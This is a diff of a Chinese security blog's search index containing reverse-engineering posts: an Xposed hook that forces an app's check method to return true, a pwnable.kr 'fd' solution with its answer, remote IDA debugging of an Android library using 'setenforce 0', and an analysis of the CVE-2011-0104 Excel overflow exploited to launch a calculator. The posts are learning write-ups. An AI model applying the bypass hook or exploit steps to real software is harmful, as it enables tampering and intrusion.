-<h3 id="导入lib文件"><a href="#导入lib文件" class="headerlink" title="导入lib文件"></a>导入lib文件</h3><blockquote>
-<p>新建安卓项目，这个应该很简单。需要导入jar文件-XposedBridgeApi-54.jar。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p4.png" alt="结构图-4"></p>
-</li>
-</ol>
-<blockquote>
-<p>新建文件夹，命名为lib,然后将XposedBridgeApi-54.jar复制过来。右键Add as library。这样就能看到里面的类了。</p>
-</blockquote>
-<p> <img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p5.png" alt="结构图-5"></p>
-<blockquote>
-<p>然后修改build.gradle文件，将compile改为provided。</p>
-</blockquote>
-<p> <img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p6.jpg" alt="结构图-6"></p>
-<h3 id="AndroidManifest-xml文件修改"><a href="#AndroidManifest-xml文件修改" class="headerlink" title="AndroidManifest.xml文件修改"></a>AndroidManifest.xml文件修改</h3><p>需要在配置文件中添加一些属性。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;application&gt;</span><br><span class="line">        &lt;meta-data android:name&#x3D;&quot;xposedmodule&quot; android:value&#x3D;&quot;true&quot;&#x2F;&gt;</span><br><span class="line">        &lt;meta-data android:name&#x3D;&quot;xposeddescription&quot; android:value&#x3D;&quot;模块第一次测试&quot;&#x2F;&gt;</span><br><span class="line">        &lt;meta-data android:name&#x3D;&quot;xposedminversion&quot; android:value&#x3D;&quot;54&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;application&gt;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>xposedmodule:判断是否是xposed模块，xposed根据这个来判断是否是模块。<br>xposeddescription：模块描述，会显示在xposed框架模块列表中。<br>xposedminversion：最低xposed版本号，lib文件名可知。</p>
-</blockquote>
-<h3 id="入口类编写"><a href="#入口类编写" class="headerlink" title="入口类编写"></a>入口类编写</h3><blockquote>
-<p>创建一个类，实现IXposedHookLoadPackage借口，重写handLoadPackage方法，这里创建了一个xposedmain类。</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class xposedmain implements IXposedHookLoadPackage &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam Param) throws Throwable &#123;</span><br><span class="line">        if(Param.packageName.equals(&quot;com.example.zzwbi.check&quot;))&#x2F;&#x2F;匹配包名</span><br><span class="line">        &#123;</span><br><span class="line">            XposedBridge.log(&quot;Loaded APP:&quot;+Param.packageName);&#x2F;&#x2F;XposedBridge.log相当于日志输出。</span><br><span class="line">            try &#123;</span><br><span class="line">                findAndHookMethod(&quot;com.example.zzwbi.check.MainActivity&quot;, Param.classLoader, &quot;compare&quot;, String.class, new get_True());</span><br><span class="line">                                  &#x2F;&#x2F;类名，一般都写Param.classLoader,方法名，参数...,hook的方法</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                XposedBridge.log(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class get_True extends XC_MethodHook &#123;</span><br><span class="line">    protected void beforeHookedMethod(XC_MethodHook.MethodHookParam param) throws Throwable &#123;</span><br><span class="line">        XposedBridge.log(&quot;beforeHookedMethod userName:&quot; + param.args[0]);</span><br><span class="line">        &#x2F;&#x2F;hook前的一些操作</span><br><span class="line">    &#125;</span><br><span class="line">    protected void afterHookedMethod(XC_MethodHook.MethodHookParam args) throws Throwable &#123;</span><br><span class="line">        &#x2F;&#x2F;hook后的一些操作</span><br><span class="line">        args.setResult(true);</span><br><span class="line">        XposedBridge.log(&quot;使返回值为true&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="设置启动入口"><a href="#设置启动入口" class="headerlink" title="设置启动入口"></a>设置启动入口</h3><blockquote>
-<p>新建assets文件夹,在里面新建文件名为xposed_init,写入你自己创建的xposedmain类包名。</p>
-</blockquote>
-<p> <img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p7.png" alt="启动入口-7"></p>
-<blockquote>
-<p>包名+类名</p>
-</blockquote>
-<p> <img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p8.png" alt="示意图-8"></p>
-<h3 id="安装激活插件"><a href="#安装激活插件" class="headerlink" title="安装激活插件"></a>安装激活插件</h3><blockquote>
-<p>将apk安装到模拟器上，重启后即可看到插件效果。</p>
-</blockquote>
-<p> <img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p9.png" alt="启用插件-9"></p>
-<blockquote>
-<p>下面看下hook效果</p>
-</blockquote>
-<p> <img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p10.png" alt="Hook成功-10"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
-<p>这只是对于Xposed学习的一次小尝试。对于其Hook还有很多地方要学习。例如静态field变量,隐藏函数，内部类，匿名内部类，构造函数的Hook都要继续研究。</p>
-</blockquote>
-<p>####参考链接:<br><a href="http://blog.csdn.net/jiabailong/article/details/52368002" target="_blank" rel="noopener">http://blog.csdn.net/jiabailong/article/details/52368002</a><br> <a href="http://blog.csdn.net/wxyyxc1992/article/details/17320911" target="_blank" rel="noopener">http://blog.csdn.net/wxyyxc1992/article/details/17320911</a><br><a href="http://www.freebuf.com/articles/terminal/114910.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/terminal/114910.html</a></p>
 ]]></content>
       <categories>
         <category>逆向技术学习</category>
       </categories>
       <tags>
         <tag>Android</tag>
-        <tag>Xposed</tag>
+        <tag>夜神模拟器</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Pwnable.kr题解之Fd</title>
+    <url>/2018/03/26/Pwnable.kr%E9%A2%98%E8%A7%A3%E4%B9%8BFd/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>作为一名专业打酱油选手参加了强网杯，结果是相当失败。大部分题目都是Pwn题，有心无力，只叹自己学艺不精，所以准备好好学习Pwn。准备长期和<a href="http://www.pwnable.kr" target="_blank" rel="noopener">pwnable.kr</a>死磕。接下来正式开始个人的Pwn之旅。</p>
+</blockquote>
+<a id="more"></a>
+<h2 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h2><blockquote>
+<p>在Pwnable.kr网站注册登陆后，就可以做题了。这里是第一题Fd,显示如下：</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p1.png" alt=""></p>
+<blockquote>
+<p><a href="https://youtu.be/971eZhMHQQw" target="_blank" rel="noopener">https://youtu.be/971eZhMHQQw</a>是关于这道题的视频讲解，不过是在youtube上，翻墙了才能看，不过国内也有很多题解，足够了。<br>下面是ssh的链接地址。在linux系统中用这个就可以链接，密码是guest。链接效果如下：</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p2.png" alt=""></p>
+<blockquote>
+<p>不过我们想要下载源码怎么办呢？这里推荐一款连接工具：winscp,百度一下就可以下载。软件界面如下：</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p3.png" alt=""></p>
+<blockquote>
+<p>登录成功界面：</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p4.png" alt=""></p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><blockquote>
+<p>经过上面的过程我们可以获得elf文件和程序源码。但在比赛中，并不会提供程序源码，所以也不去看。先运行下程序，看看是怎么样的。将程序拷贝到linux中，先不使用ssh连接，时间久了会卡死。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p5.png" alt=""></p>
+<blockquote>
+<p>由于个人习惯，会使用file命令查看文件的有关信息，看是32/64位环境运行。然后就是添加权限运行。第一次运行提示缺少参数，第二次运行添加参数，然后报错。接下来就是分析汇编代码。</p>
+</blockquote>
+<h3 id="汇编代码分析"><a href="#汇编代码分析" class="headerlink" title="汇编代码分析"></a>汇编代码分析</h3><blockquote>
+<p>为了提高自己阅读汇编代码的能力，先不直接使用IDA。使用命令<br>objdump -d fd<br>查看代码。反汇编代码如下(仅main部分)：</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p6.png" alt=""><br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p7.png" alt=""></p>
+<blockquote>
+<p>简单解释下汇编代码的含义：</p>
+</blockquote>
+<blockquote>
+<p>8048494:          push   %ebp<br>8048495:      mov    %esp,%ebp<br>8048497:    push   %edi<br>8048498:    push   %esi//把ebp压入栈中,保存ebp指向目前的栈顶，把edi和esi压入栈，为了保存寄存器。<br>8048499:and    $0xfffffff0,%esp<br>804849c: sub    $0x20,%esp //开辟栈空间</p>
+</blockquote>
+<blockquote>
+<p>804849f: cmpl   $0x1,0x8$(%ebp)<br> 80484a3: jg     80484bb &lt;main+0x27&gt;<br> //0x8(%ebp)保存着输入的第一个参数，如果没有参数则不跳转。</p>
+</blockquote>
+<blockquote>
+<p>80484a5:    movl   $0x8048630, (%esp)<br> 80484ac:   call   8048380 &lt;puts@plt&gt;<br> 80484b1:   mov    $0x0, %eax<br> 80484b6:   jmp    8048559 &lt;main+0xc5&gt;  //当没有参数时的执行流，输出字符串然后跳转到最后。</p>
+</blockquote>
+<blockquote>
+<p>80484bb:    mov    0xc(%ebp),%eax//当有输入参数的执行流。<br> 80484be:   add    $0x4,%eax<br> 80484c1:    mov    (%eax),%eax<br> 80484c3:   mov    %eax,(%esp)<br> 80484c6:  call   80483d0 &lt;atoi@plt&gt; //将输入的字符串转为数字(十六进制)<br> 80484cb: sub    $0x1234, $eax //eax此刻保存着输入参数的值，十六进制值减去0x1234<br> 80484d0:    mov    %eax,0x18(%esp) //保存数据已经减去0x1234<br> 80484d4: movl    $0x0,0x1c($ %esp)<br> 80484db:    00<br> 80484dc: movl   $0x20,0x8(%esp)//第三个参数<br> 80484e3:  00<br> 80484e4: movl   $ $0x804a060,0x4(%esp)//第二个参数，保存数据的内存位置<br> 80484eb:    08<br> 80484ec: mov    0x18(%esp),%eax<br> 80484f0: mov    %eax,(%esp) //第一个参数（文件描述符）<br> 80484f3: call   8048370 &lt; read@plt&gt;//根据文件描述符来判断输入还是输出<br> 80484f8:    mov    %eax,0x1c(%esp)<br> 80484fc:   mov    $0x8048646, %edx<br> 8048501:   mov    $0x804a060,%eax<br> 8048506:    mov    $ $0xa,%ecx<br> 804850b:     mov    %edx,%esi<br> 804850d:     mov    %eax,%edi<br> 804850f:    repz cmpsb %es:(%edi),%ds:(%esi)<br> 8048511:    seta   %dl<br> 8048514:    setb   %al<br> 8048517:    mov    %edx,%ecx<br> 8048519:    sub    %al,%cl<br> 804851b:      mov    %ecx,%eax<br> 804851d:    movsbl %al,%eax<br> 8048520:    test   %eax,%eax //输入的数据和0x8048060保存的数据作对比<br> 8048522:    jne    8048548 &lt;main+0xb4&gt;//如果正确则输出flag,错误则结束<br> 8048524:    movl   $0x8048650,(%esp)<br> 804852b:   call   8048380 &lt;puts@plt&gt;<br> 8048530:    movl   $0x804865c,(%esp)<br> 8048537:    call   8048390 &lt;system@plt&gt;<br> 804853c:    movl   $0x0,(%esp)<br> 8048543:    call   80483b0 &lt;exit@plt&gt;<br> 8048548:    movl   $0x804866a,(%esp)<br> 804854f:      call   8048380 &lt;puts@plt&gt;<br> 8048554:    mov    $0x0,%eax<br> 8048559:    lea    -0x8(%ebp),%esp<br> 804855c:   pop    %esi<br> 804855d:   pop    %edi<br> 804855e:    pop    %ebp<br> 804855f:    ret  </p>
+</blockquote>
+<h3 id="文件描述符简介"><a href="#文件描述符简介" class="headerlink" title="文件描述符简介"></a>文件描述符简介</h3><table>
+<thead>
+<tr>
+<th>项文件描述符</th>
+<th align="right">缩写</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td align="right">STDIN</td>
+<td align="center">标准输入</td>
+</tr>
+<tr>
+<td>1</td>
+<td align="right">STDOUT</td>
+<td align="center">标准输出</td>
+</tr>
+<tr>
+<td>2</td>
+<td align="right">STDERR</td>
+<td align="center">标准错误输出</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>通俗讲解：<br>当项文件描述符为0时：可理解为要从键盘输入内存，即为和计算机交互时的输入。<br>当项文件描述符为1时：可理解为从内存显示到显示器，即为和计算机交互时的输出。<br>当项文件描述符为2时：可理解为出现错误时的输出，即为和计算机交互时出现错误会显示到显示器。</p>
+</blockquote>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><blockquote>
+<ol>
+<li>首先要保证有一个参数，不然程序会报错。<ol start="2">
+<li>参数减去4660，等于文件描述符。</li>
+<li>文件描述符必须为0，这样才会有接下来的输入。</li>
+<li>输入会和内存中的数据进行对比。</li>
+<li>使用GDB调试可得内存作比较的内容为“LETMEWIN”<br>所以解题为先输入4660，再输入“LETMEWIN”。</li>
+</ol>
+</li>
+</ol>
+</blockquote>
+<blockquote>
+<p>再次使用ssh连接</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p8.png" alt=""></p>
+<h3 id="IDA反编译源码"><a href="#IDA反编译源码" class="headerlink" title="IDA反编译源码"></a>IDA反编译源码</h3><blockquote>
+<p>可以使用IDA，按下F5反编译源码。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p9.png" alt=""></p>
+<blockquote>
+<p>fd.c文件代码：</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p10.png" alt=""></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
+<p>这是Pwnable.kr的第一题，分析的比较细致，学到了很多知识。里面的一些东西还不太清楚，希望在以后的学习过程中能有所顿悟。</p>
+</blockquote>
+<p>个人总结，难免有错。欢迎大佬留言指正，共同交流。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h2><p><a href="https://blog.csdn.net/xlinsist/article/details/51147212" target="_blank" rel="noopener">https://blog.csdn.net/xlinsist/article/details/51147212</a><br> <a href="https://www.cnblogs.com/orlion/p/5765339.html" target="_blank" rel="noopener">https://www.cnblogs.com/orlion/p/5765339.html</a></p>
+]]></content>
+      <categories>
+        <category>其他</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>IDA调试动态链接库</title>
+    <url>/2018/03/30/IDA%E8%B0%83%E8%AF%95%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>在上篇文章中描述了编写动态链接库的过程，本想把调试部分也添加到里面，考虑到篇幅原因就在这次写了。网上也有很多方法，使用 adb  shell am start……..之类的，但我觉得非虫大佬的最简单实用。这里就简单记录下，免得以后忘。案例使用上次编写的程序JNItest，为了达到效果，特意买了部二手小米手机，刷机到开发版，便于开启root。因为前期的熬夜尝试发现模拟器不支持arm的so调试，这是一个很大的坑。下面开始过程的介绍</p>
+</blockquote>
+<a id="more"></a>
+<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><h3 id="拷贝android-server"><a href="#拷贝android-server" class="headerlink" title="拷贝android_server"></a>拷贝android_server</h3><blockquote>
+<p>找到IDA的安装路径，打开dbgsrv目录，将android_server拷贝到手机的/data/local/tmp目录下。这里为了避免从C盘的权限，我将android_server先复制到桌面的一个文件夹，然后使用adb上传。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p1.png" alt=""> </p>
+<blockquote>
+<p>此时手机用数据线链接到电脑的。打开电脑cmd，输入命令</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb push C:&#x2F;Users&#x2F;zzwbi&#x2F;Desktop&#x2F;upload&#x2F;android_server  &#x2F;data&#x2F;local&#x2F;tmp</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p2.png" alt=""> </p>
+<h3 id="运行android-server"><a href="#运行android-server" class="headerlink" title="运行android_server"></a>运行android_server</h3><p>运行命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb shell                                 &#x2F;&#x2F;进入手机的shell</span><br><span class="line">cd &#x2F;data&#x2F;local&#x2F;tmp                        &#x2F;&#x2F;进入存放的目录</span><br><span class="line">ls -al                                    &#x2F;&#x2F;查看目录下所有文件及属性</span><br><span class="line">chmod 777 android_server                  &#x2F;&#x2F;修改权限</span><br><span class="line">.&#x2F;android_server                          &#x2F;&#x2F;运行</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p3.png" alt=""> </p>
+<blockquote>
+<p>过程中可能会有权限限制，建议使用root权限执行以上命令</p>
+</blockquote>
+<h3 id="进行端口转发"><a href="#进行端口转发" class="headerlink" title="进行端口转发"></a>进行端口转发</h3><blockquote>
+<p>新开一个cmd窗口。执行命令adb forward tcp:23946  tcp:23946</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p4.png" alt=""> </p>
+<h3 id="使用IDA进行附加"><a href="#使用IDA进行附加" class="headerlink" title="使用IDA进行附加"></a>使用IDA进行附加</h3><blockquote>
+<p>首先在手机中打开程序，这样附加时就会有这个进程，不然找不到。<br>启动IDA Pro程序，点击菜单项Debugger—&gt;Attach—&gt;Remote ArmLinux/Android debugger,打开程序设置对话框 </p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p5.png" alt=""> </p>
+<blockquote>
+<p>但这时可能会弹出一个错误对话框。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p6.png" alt=""> </p>
+<blockquote>
+<p>这时需要关闭selinux安全机制(需要root权限)。在adb中执行</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setenforce 0</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p7.png" alt=""> </p>
+<blockquote>
+<p>关闭后，我们重新附加进程。这时会弹出进程列表。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p8.png" alt=""> </p>
+<blockquote>
+<p>这里要注意，此时我们要调试的so文件还没有加载到进程中，我们要先在手机界面点击，让so加载到程序中，这样调试时就会有可以找到so文件。<br>这样IDA会出现各种界面，我们留意左上角的那个模块框。放大找到我们要调试的so文件。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p10.png" alt=""> </p>
+<blockquote>
+<p>双击进入，找到check函数</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p11.png" alt=""> </p>
+<blockquote>
+<p>点击进入汇编代码，在开始处单击，这样就下好一个断点，程序运行到这里就会停下。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p12.png" alt=""> </p>
+<h3 id="开始运行调试"><a href="#开始运行调试" class="headerlink" title="开始运行调试"></a>开始运行调试</h3><blockquote>
+<p>此时手机的状态是挂起，屏幕什么的都操作不了，点击IDA左上角的绿色小箭头，程序就可以运行，就能在手机中输入字符。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p14.png" alt=""> </p>
+<blockquote>
+<p>手机中已经可以输入字符了，输入后就可以单击check，这时程序就会断下</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p15.png" alt=""> </p>
+<blockquote>
+<p>IDA中显示</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p16.png" alt=""> </p>
+<blockquote>
+<p>接下来就可以调试了。</p>
+</blockquote>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
+<p>对于这次so调试，踩了很多坑，模拟器不能调arm的so，这个是收获最大的了。</p>
+</blockquote>
+<p>个人拙见，错误之处请大佬指正，欢迎留言交流。</p>
+]]></content>
+      <categories>
+        <category>逆向技术学习</category>
+      </categories>
+      <tags>
+        <tag>IDA动态</tag>
+        <tag>so调试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2011-0104漏洞分析</title>
+    <url>/2018/07/25/CVE-2011-0104%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><blockquote>
+<p>CVE-2011-0104是microsoft excel在解析XLB文件时导致的一个溢出。xlb文件是Excel表格里面的一个设置文件，通常记录用户的操作，并非恶意文件。溢出可导致执行任意代码。本文在分析漏洞的基础上，简单利用漏洞弹出计算器。</p>
+</blockquote>
+<a id="more"></a>
+<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><blockquote>
+<p>系统：Windows xp pro sp2<br>软件：windows office 2003<br>调试器：immunity Debugger<br>Poc生成：漏洞战争配套资料</p>
+</blockquote>
+<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><ul>
+<li>打开一个空白的excel程序</li>
+<li>打开immunity Debugger,附加excel进程</li>
+<li>按下F9将程序运行起来。</li>
+<li>在打开的excel中使用file–&gt;open打开配套资料中的exploit.xlb文件。</li>
+</ul>
+<blockquote>
+<p>异常触发：</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/1.png" alt="cve-2011-0104"></p>
+<blockquote>
+<p>可以看到异常是一个访问异常。这时要查找异常产生的源头。向上查看代码，重点关注</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>以上两个代码是函数开始处的常规操作，向上找可以发现0x300ce252地址处为函数开始。这个就是出错函数的起始位置 </p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/2.png" alt="cve-2011-0104"></p>
+<blockquote>
+<p>再次重新加载程序，在0x300ce252地址处下断点，并对esp栈顶内存下写入断点。这里对此做一个解释，为什么下这个断点呢。因为漏洞在复制数据时会覆盖此地址，此地址是调用0x300ce252函数的返回地址。一旦数据覆盖进行写入操作，就会触发断点，这就定位到了异常出错位置。</p>
+</blockquote>
+<ul>
+<li>打开一个空白的excel程序</li>
+<li>打开immunity Debugger,附加excel进程</li>
+<li>使用bp 300ce252命令下断点。</li>
+<li>按下F9将程序运行起来。</li>
+<li>在打开的excel中使用file–&gt;open打开配套资料中的exploit.xlb文件。</li>
+<li>程序断下</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/3.png" alt="cve-2011-0104"></p>
+<blockquote>
+<p>内存断点下好后，F9运行，可以看到程序停在了0x300ce3c8地址处，又是一个复制数据出错。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/4.png" alt="cve-2011-0104"></p>
+<blockquote>
+<p>观察寄存器ebp和edi,之间的大小就是允许复制的数据。计算可得为0x60字节大小。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/5.png" alt="cve-2011-0104"></p>
+<blockquote>
+<p>分析可知复制了96个字节，edi的值递增覆盖到栈顶0x13aa90,后面利用的跳板地址。单步运行到程序末尾处，返回可以发现是出错复制代码位于call 0x300ce380中。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/6.png" alt="cve-2011-0104"></p>
+<blockquote>
+<p>为了后面更好的搞清楚栈的覆盖和漏洞利用，有必要梳理下函数调用关系。<br><strong>1.</strong>首先定位在0x300ce252,单步运行程序，一步步通过观察堆栈内容是否覆盖来判断程序调用流程。再次重新加载程序。加载过程同上。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/7.png" alt="cve-2011-0104"></p>
+<blockquote>
+<p>经过0x302188d8地址处的call excel.306deefe后，栈区被一些乱七八糟的数据填充。可以判断，异常位于这个call中。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/8.png" alt="cve-2011-0104"></p>
+<blockquote>
+<p><strong>2.</strong>下面要做的就是重新加载程序，在0x302188d8地址处下断点，然后进入call深入分析。<br>进入函数中可以看到。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/9.png" alt="cve-2011-0104"></p>
+<blockquote>
+<p>梳理总结下流程。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/10.png" alt="cve-2011-0104"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote>
+<p>调试分析可以总结得到，数据覆盖的是sub_300ce252函数的返回地址。也就是栈地址0x13aa90。有了返回地址，还要注意到返回时的ret 2c指令，收回了44个空间大小的数据。这样基本就可以完成漏洞利用了。但当程序运行到0x300CE361处的MOV DWORD PTR DS:[EAX],ECX时出现访问违例：访问到一个不可写的地址0x51453844，此时EAX=0x51453844，向上回溯程序，找出EAX的赋值处，发现在0x300CE354处出现给EAX赋值的操作: MOV EAX, DWORD PTR SS:[EBP+2C]，此时EBP=0x0013AA8C,EBP+2C=0x0013AAB8,0x0013AAB8处的值恰好是0x51453844。观察栈中的数据，51453844恰好又是shellcode中的数据。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/11.png" alt="cve-2011-0104"></p>
+<blockquote>
+<p>根据栈区和样本数据中对应出现的数据，修改相应数值，并添加shellcode。即可利用。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/12.png" alt="cve-2011-0104"></p>
+<blockquote>
+<p>利用效果</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180725/13.png" alt="cve-2011-0104"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
+<p>这次由于时间原因，写的比较仓促可能具体细节不怎么具体。后续再补上，欢迎交流指导。</p>
+</blockquote>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0104" target="_blank" rel="noopener">cve-2011-0104</a><br><a href="https://bbs.pediy.com/thread-217940.htm" target="_blank" rel="noopener">看雪的精品文章</a><br><a href="http://www.cnblogs.com/Ox9A82" target="_blank" rel="noopener">Ox9A82</a><br><a href="https://www.securityfocus.com/bid/47245" target="_blank" rel="noopener">安全焦点</a></p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>文档漏洞</tag>
+        <tag>栈溢出</tag>
       </tags>
   </entry>
   <entry>
@@ -795,132 +952,129 @@
       </tags>
   </entry>
   <entry>
-    <title>IDA调试动态链接库</title>
-    <url>/2018/03/30/IDA%E8%B0%83%E8%AF%95%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
-<p>在上篇文章中描述了编写动态链接库的过程，本想把调试部分也添加到里面，考虑到篇幅原因就在这次写了。网上也有很多方法，使用 adb  shell am start……..之类的，但我觉得非虫大佬的最简单实用。这里就简单记录下，免得以后忘。案例使用上次编写的程序JNItest，为了达到效果，特意买了部二手小米手机，刷机到开发版，便于开启root。因为前期的熬夜尝试发现模拟器不支持arm的so调试，这是一个很大的坑。下面开始过程的介绍</p>
-</blockquote>
-<a id="more"></a>
-<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><h3 id="拷贝android-server"><a href="#拷贝android-server" class="headerlink" title="拷贝android_server"></a>拷贝android_server</h3><blockquote>
-<p>找到IDA的安装路径，打开dbgsrv目录，将android_server拷贝到手机的/data/local/tmp目录下。这里为了避免从C盘的权限，我将android_server先复制到桌面的一个文件夹，然后使用adb上传。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p1.png" alt=""> </p>
-<blockquote>
-<p>此时手机用数据线链接到电脑的。打开电脑cmd，输入命令</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb push C:&#x2F;Users&#x2F;zzwbi&#x2F;Desktop&#x2F;upload&#x2F;android_server  &#x2F;data&#x2F;local&#x2F;tmp</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180330/p2.png" alt=""> </p>
